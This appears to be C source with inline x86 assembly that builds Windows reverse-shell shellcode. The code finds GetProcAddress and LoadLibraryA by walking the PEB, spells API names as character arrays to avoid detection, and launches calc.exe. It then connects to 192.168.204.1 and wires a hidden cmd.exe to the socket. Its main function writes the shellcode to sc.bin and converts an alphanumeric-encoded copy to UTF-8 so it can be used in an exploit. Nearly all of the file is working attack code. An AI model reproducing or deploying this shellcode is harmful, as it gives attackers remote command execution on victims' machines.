#include <stdio.h>
#include <Windows.h>
#include <wchar.h>
void findGetProAddrByPeb(DWORD flag);
void BreakPoint();
typedef FARPROC(WINAPI *FunGetProAddr)  (HMODULE h, LPCSTR name);
typedef HMODULE(WINAPI *FunGetLoadLirA) (LPCSTR name);
typedef UINT   (WINAPI *FunWinExec)     (LPCSTR lpCmdLine, UINT uCmdShow);
typedef void   (WINAPI *FunExitPro)     (UINT uExitCode);
typedef LPTSTR (WINAPI *FunlstrcatA)    (LPTSTR lpString1,LPCTSTR lpString2);
typedef BOOL   (WINAPI *FunRevertToSelf)();

typedef int    (WINAPI *FunWSAStartup)  (WORD wVersionRequired,LPWSADATA lpWSAData);
typedef SOCKET (WINAPI *Funsocket)      (int af,int type,int protocol);
typedef int    (WINAPI *Funinet_addr)   (char *a);
typedef u_short(WINAPI *Funhtons)       (u_short hostshort);
typedef int    (WINAPI *FunConnect)     (SOCKET  s,const struct sockaddr *name,int namelen);
typedef void   (WINAPI *Funmemset)      (void *dest,int c,size_t count);
typedef UINT   (WINAPI *FunGetSystemDirectoryA)(LPSTR lpBuffer,UINT  uSize);
typedef BOOL   (WINAPI *FunCreateProcessA)(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL  (WINAPI *FunCreatePipe)(PHANDLE hReadPipe,PHANDLE hWritePipe,LPSECURITY_ATTRIBUTES lpPipeAttributes,DWORD nSize);
typedef BOOL  (WINAPI *FunPeekNamedPipe)(HANDLE hNamedPipe,LPVOID lpBuffer,DWORD nBufferSize,LPDWORD lpBytesRead,LPDWORD lpTotalBytesAvail,LPDWORD lpBytesLeftThisMessage);
typedef BOOL  (WINAPI *FunReadFile)(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped);
typedef int   (WINAPI *Funsend)(SOCKET s,const char *buf,int len,int flags);
typedef size_t(__cdecl *Funstrlen)(const char *str);
typedef BOOL  (WINAPI *FunWriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
typedef BOOL  (WINAPI *FunTerminateProcess)(HANDLE hProcess,UINT uExitCode);
typedef int   (WINAPI *Funrecv)(SOCKET s,char *buf,int len,int flags);
typedef void  (WINAPI *FunSleep)(DWORD dwMilliseconds);
typedef int  (__cdecl *Funmalloc)(size_t size);
void  shellcodeend()
{
	HMODULE        hKernel32;
	HMODULE        hAdvapi32;
	HMODULE        hws2_32;
	HMODULE        hMsvcrt;
	HANDLE         hReadPipe1; 
	HANDLE         hWritePipe1;
	HANDLE         hReadPipe2;
	HANDLE         hWritePipe2;
	FunRevertToSelf      fRevertToSelf = NULL;
	FunGetProAddr        fGetProAddr   = NULL;
	FunGetLoadLirA       fLoadLibraryA = NULL;
	FunWinExec	         fWinexec      = NULL;
	FunlstrcatA          fLstrcatA     = NULL;
	FunExitPro           fExitPro      = NULL;
	FunCreateProcessA    fCreateProA   = NULL;
	
	FunWSAStartup        fWSAStartup   = NULL;
	Funsocket            fSocket       = NULL;
	Funinet_addr         fInet_addr    = NULL;
	Funhtons             fHtons        = NULL;
	FunConnect           fConnect      = NULL;
	Funmemset            fMemset       = NULL;
	FunGetSystemDirectoryA fGetSystemDirectoryA = NULL;
	FunCreatePipe        fCreatePipe   = NULL;
	FunPeekNamedPipe     fPeekNamedPipe= NULL;
	FunReadFile          fReadFile     = NULL;
	Funsend              fSend         = NULL;
	Funstrlen            fStrlen       = NULL;
	FunWriteFile         fWriteFile    = NULL;
	Funrecv              fRecv         = NULL;
	FunTerminateProcess  fTerminateProcess = NULL;
	FunSleep             fSleep        = NULL;
	Funmalloc            fmalloc       = NULL;


	WSADATA             wsaData;
	SOCKET              s;
	struct sockaddr_in  sockaddr;
	SECURITY_ATTRIBUTES sa;
	int                 ret;
	STARTUPINFOA        si;  
	PROCESS_INFORMATION ProcessInformation;
	unsigned long       lBytesRead; //????????
	unsigned long       lBytesWrite;
	char kerStr[]       = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };       // kernel32.dll
	char winStr[]       = {'W', 'i', 'n', 'E', 'x', 'e', 'c', 0 };                                // WinExec
	char calcStr[]      = { 'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', 0 };                          // calc.exe
	char exitStr[]      = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's',  0 };          // ExitProcess
	char lstrcatAStr[]  = { 'l','s','t','r','c','a','t','A', 0 };								  // lstrcatA
	char createDirStr[] = { 'C','r','e','a','t','e','D','i','r','e','c','t','o','r','y','A', 0 }; // CreateDirtory
	char getSysDirAStr[] = { 'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A', 0 }; // GetSystemDirectoryA
	char createProAStr[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A', 0 };        // CreateProcessA 
	char createPiprStr[] = { 'C','r','e','a','t','e','P','i','p','e', 0 };                        // CreatePipe 
	char peekNamePipeStr[] = { 'P','e','e','k','N','a','m','e','d','P','i','p','e', 0 };          // PeekNamedPipe
	char readfileStr[]  = { 'R','e','a','d','F','i','l','e',  0 };                                // ReadFile
	char writefileStr[] = { 'W','r','i','t','e','F','i','l','e', 0 };                             // WriteFile 
//	char terproStr[]    = { 'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s', 0 }; // TerminateProcess 
	char sleepStr[]     = { 'S','l','e','e','p', 0 };                                             // Sleep

	
	char advaApi32Str[]  = { 'A','d','v','a','p','i','3','2','.','d','l','l', 0 };                // Advapi32.dll
	char rever2selfStr[] = { 'R','e','v','e','r','t','T','o','S','e','l','f', 0 };                // RevertToSelf
	
	char msvcrtStr[]     = { 'm','s','v','c','r','t','.','d','l','l', 0 };       // msvcrt.dll
	char memsetStr[]     = { 'm','e','m','s','e','t', 0 };                       // memset
	char strlenStr[]     = { 's','t','r','l','e','n', 0 };                       // strlen
	char mallocStr[]     = { 'm','a','l','l','o','c', 0 };	                     // malloc

	char ip[] = { '1','9','2','.','1','6','8','.','2','0','4','.','1', 0 };      // server ip 192.168.204.1
	int  port;
	
	char ws2_32Str[]     = { 'W','s','2','_','3','2','.','d','l','l', 0 };       // Ws2_32.dll
	char wsaStartupStr[] = { 'W','S','A','S','t','a','r','t', 'u','p', 0 };      // WSAStartup
	char socketStr[]     = { 's','o','c','k','e','t', 0 };                       // socket
	char inet_addrStr[]  = { 'i','n','e','t','_','a','d','d','r', 0 };           // inet_addr 
	char htonsStr[]      = { 'h','t','o','n','s', 0 };                           // htons
	char connectStr[]    = { 'c','o','n','n','e','c','t', 0 };                   // connect
	char *Buff;
	char *sendBuff;
	char cmdLine[256]    = { 0 };
	char cmdStr[]        = { '\\','c','m','d','.','e','x','e', 0 };              // cmd.exe
	char sendStr[]       = { 's','e','n','d', 0 };                               // send
	char recvStr[]       = { 'r','e','c','v', 0 };                               // recv 
	char rnStr[]         = { '\r','\n',0};                                       // "\r\n"
	int  i_index;
	int  peekRet;
	DWORD d;
	int  i;
	__asm{ 
		push 2;
		call findGetProAddrByPeb;
		mov fGetProAddr, eax;      GetProAddress Address
		push 1;
		call findGetProAddrByPeb;
		mov fLoadLibraryA, eax;    LoadLibrary Addresss
	}
	port          = 123456;
	lBytesRead    = 0;
	hKernel32     = fLoadLibraryA(kerStr);
	hAdvapi32     = fLoadLibraryA(advaApi32Str);
	hws2_32       = fLoadLibraryA(ws2_32Str);
	hMsvcrt       = fLoadLibraryA(msvcrtStr);
	
	
	fGetSystemDirectoryA = (FunGetSystemDirectoryA)fGetProAddr(hKernel32, getSysDirAStr);
//	fTerminateProcess = (FunTerminateProcess)fGetProAddr(hKernel32,terproStr);
	fLstrcatA      = (FunlstrcatA)      fGetProAddr(hKernel32,lstrcatAStr);
	fCreateProA    = (FunCreateProcessA)fGetProAddr(hKernel32,createProAStr); 
	fPeekNamedPipe = (FunPeekNamedPipe) fGetProAddr(hKernel32,peekNamePipeStr);
	fReadFile      = (FunReadFile)      fGetProAddr(hKernel32,readfileStr);
	fWriteFile     = (FunWriteFile)     fGetProAddr(hKernel32,writefileStr);
	fCreatePipe    = (FunCreatePipe)    fGetProAddr(hKernel32,createPiprStr);
	fSleep         = (FunSleep)         fGetProAddr(hKernel32,sleepStr);
	fExitPro       = (FunExitPro)       fGetProAddr(hKernel32,exitStr);
	fRevertToSelf  = (FunRevertToSelf)  fGetProAddr(hAdvapi32, rever2selfStr);
	fRevertToSelf();

	fWSAStartup   = (FunWSAStartup)fGetProAddr(hws2_32,wsaStartupStr);
	fSocket       = (Funsocket)    fGetProAddr(hws2_32,socketStr);
	fInet_addr    = (Funinet_addr) fGetProAddr(hws2_32,inet_addrStr);
	fHtons        = (Funhtons)     fGetProAddr(hws2_32,htonsStr);
	fConnect      = (FunConnect)   fGetProAddr(hws2_32,connectStr);
	fMemset       = (Funmemset)    fGetProAddr(hMsvcrt,memsetStr);
	fSend         = (Funsend)      fGetProAddr(hws2_32,sendStr);
	fRecv         = (Funrecv)      fGetProAddr(hws2_32,recvStr);
	fStrlen       = (Funstrlen)    fGetProAddr(hMsvcrt,strlenStr);
	fmalloc       = (Funmalloc)    fGetProAddr(hMsvcrt,mallocStr);

	Buff          = (char *)fmalloc(2048);
	sendBuff      = (char *)fmalloc(2048);
	fMemset(Buff, 0 , 2048);
	fMemset(sendBuff, 0 , 2048);

	fWinexec = (FunWinExec)fGetProAddr(hKernel32, winStr);
	fWinexec(calcStr,0);
		
	
//  tcp - connect  
	fWSAStartup(MAKEWORD(2, 2), &wsaData);
	s = fSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_addr.S_un.S_addr = fInet_addr(ip);
	sockaddr.sin_port = fHtons(port);
	fConnect(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));
	
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = 0;
	sa.bInheritHandle = TRUE;
	
	if (!fCreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0)){
		fExitPro(0);
	}
	if (!fCreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0)){
		fExitPro(0);
	}
	
	fMemset(&si,0,sizeof(si));
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hReadPipe2;   //  si.hStdInput = s 
	si.hStdOutput = hWritePipe1; //  si.hStdOutput= s
	si.hStdError = hWritePipe1;
	fGetSystemDirectoryA(cmdLine, sizeof(cmdLine));
	fLstrcatA(cmdLine,cmdStr);
	
	if (fCreateProA(cmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &ProcessInformation) == 0){
		fExitPro(0);
	}
	
	while (TRUE) {
		fMemset(Buff, 0 , 2048);
		i_index = 0;
		
		peekRet = fPeekNamedPipe(hReadPipe1, Buff, 2048, &lBytesRead, 0, 0);

		for(i = 0; i < 20 && lBytesRead == 0; i++){
			fSleep(100);
			peekRet = fPeekNamedPipe(hReadPipe1, Buff, 2048, &lBytesRead, 0, 0);
		}
		if(lBytesRead > 0){
			fMemset(Buff, 0, 2048);
			fReadFile(hReadPipe1, Buff, lBytesRead, &d, 0);
			fSend(s, Buff, fStrlen(Buff), NULL);
			//fWriteFile(hWritePipe2, rnStr, fStrlen(rnStr), &lBytesWrite, 0);
			
		}
		else{
			//fWriteFile(hWritePipe2, rnStr, fStrlen(rnStr), &lBytesWrite, 0);
			//fReadFile(hReadPipe1, Buff, lBytesRead, &d, 0);
			fMemset(sendBuff, 0 , 2048);
			if (fRecv(s, sendBuff, MAXBYTE, 0) <= 0) {
				fTerminateProcess(ProcessInformation.hProcess, 0);
				fExitPro(0);
			}
			if (!fWriteFile(hWritePipe2, sendBuff, fStrlen(sendBuff), &lBytesWrite, 0)){
				fTerminateProcess(ProcessInformation.hProcess, 0);
				fExitPro(0);
			}
			//fReadFile(hReadPipe1, Buff, lBytesRead, &d, 0);
			//fWriteFile(hWritePipe2, rnStr, fStrlen(rnStr), &lBytesWrite, 0);
		}

		fSleep(100);
	}


}
void __declspec(naked) findGetProAddrByPeb(DWORD flag)
{
	__asm{
		push ebp;
		mov ebp, [esp+8];
		push ebx;
		push edi;
		push esi;
		xor eax, eax;
		mov eax, fs:[0x30];    Pointer to PEB
		mov eax, [eax + 0xc];  Pointer to Ldr
		mov eax, [eax + 0x1c]; Pointer to InInitializationOrderLinks
	next_mod:
		mov esi, [eax + 0x8];  Poniter to DllBase
		mov edi, [eax + 0x20]; Poniter to BaseDllName
		mov eax, [eax];		   Poniter to next module InMemoryOrderLinks
		xor ebx, ebx;
	add_kerstr:
		cmp dword ptr[edi + 0xc], 0x00320033; add module name
		jne next_mod;

		cmp word ptr[edi + 0x10], 0x002e;
		jne next_mod;
	_found:
		mov edi, esi;                get kernel32.dll address
	_findGetProcAddr:
		mov eax, [edi + 0x3c];       PE Header offset
		mov edx, [edi + eax + 0x78]; Exports table offset
		add edx, edi;
		mov ecx, [edx + 0x18];       number of functions
		mov ebx, [edx + 0x20];       offset of Function Name
		add ebx, edi;
	search:
		dec ecx;
		mov esi, [ebx + ecx * 4];
		add esi, edi;
		mov eax, 0x50746547;         PteG("GetP")
		cmp[esi], eax;
		jnz search;
		mov eax, 0x41636f72;         Acor("rocA")
		cmp[esi + 4], eax;
		jnz search;
		mov ebx, [edx + 0x24];       offset of Function Address
		add ebx, edi;			     index  of Function address
		mov cx, [ebx + ecx * 2];     function index
		mov ebx, [edx + 0x1c];     
		add ebx, edi;
		mov eax, [ebx + ecx * 4];
		add eax, edi;
		mov ebx, eax;                GetProcAddress -> ebx 
		
	_getLoadLibraryA:
		push 0;
		push 0x41797261; Ayra("aryA");
		push 0x7262694c; rbiL("Libr");
		push 0x64616f4c; daoL("Load");
		push esp;
		push edi;
		call ebx;        eax = LoadLibrary
		pop ecx;
		pop ecx;
		pop ecx;
		pop ecx;
		cmp ebp, 1;
		jnz _ret2;
		pop esi;
		pop edi;
		pop ebx;
		pop ebp;
		ret 4;           ret LoadLibrary Address
	_ret2:
		mov eax, ebx;    flag = 2
		pop esi;
		pop edi;
		pop ebx;
		pop ebp;
		ret 4;           ret GetProcAddress 
	}
}

int main()
{
	DWORD    dSize;
	DWORD    dWrite;
	DWORD    dwErr;
	HANDLE   hFile;
	HANDLE   hRead;
	HANDLE   hWrite;
	wchar_t  dBuf[0x4000];
	wchar_t  uBuf[0x4000];
	char     chBuffer[0x4000];
	int      wLen ;

	dWrite = 0;
	memset(dBuf,0,0x4000);
	memset(uBuf,0,0x4000);
	memset(chBuffer,0,sizeof(chBuffer));
	printf("findGetProAddrByPeb :%p\n", findGetProAddrByPeb);
	printf("shellcodeend :%p\n", shellcodeend);
	dSize = (DWORD)main - (DWORD)shellcodeend;
	printf("main-findGetProAddrByPeb = %x\n", dSize);

	hFile = CreateFileA("sc.bin",GENERIC_ALL,0,NULL,CREATE_ALWAYS,0,NULL);
	if(!hFile){
		printf("Create File Error..\n");
		return 1;
	}
	WriteFile(hFile,shellcodeend,dSize,&dWrite,NULL);
	CloseHandle(hFile);

	/* Alpha shellcode to utf-8
	** The first step is covert  my shellcode to an alpha shellcode .
	** then , convert the Alpha shellcode to Utf-8
	*/
	hRead = CreateFileA("alphasc.bin",GENERIC_READ,0,NULL,OPEN_EXISTING ,0,NULL);
	if(!hRead){
		printf(" alphasc.bin : CreateFileA  File Error..\n");
		return 1;
	}
	dSize = GetFileSize(hRead,NULL);
	if(!ReadFile(hRead, chBuffer, dSize, &dSize, NULL)){
		printf("alphasc.bin : Read File Content Error..\n");
		return 1;
	}
	printf("chBuffer = %p \n",chBuffer);


	wLen = WideCharToMultiByte(CP_UTF8, 0, chBuffer, dSize, NULL, 0,NULL,NULL);
	printf("length = %d \n",wLen);
	
	if(!WideCharToMultiByte(CP_UTF8, 0, chBuffer, dSize, &dBuf, wLen,NULL,NULL)){
		printf("WideCharToMultiByte Error..\n");
		return 1;
	}
	printf("dBuf = %p \n",dBuf);

	hFile = CreateFileA("utf8.bin",GENERIC_ALL,0,NULL,CREATE_ALWAYS,0,NULL);
	if(!hFile){
		printf("utf8.bin : Create File Error..\n");
		return 1;
	}
	WriteFile(hFile,dBuf,wLen,&dWrite,NULL);
	CloseHandle(hFile);
//	BreakPoint();
	shellcodeend();
	return 0; 
}
void BreakPoint()
{
	_asm{
		int 3;
	}
}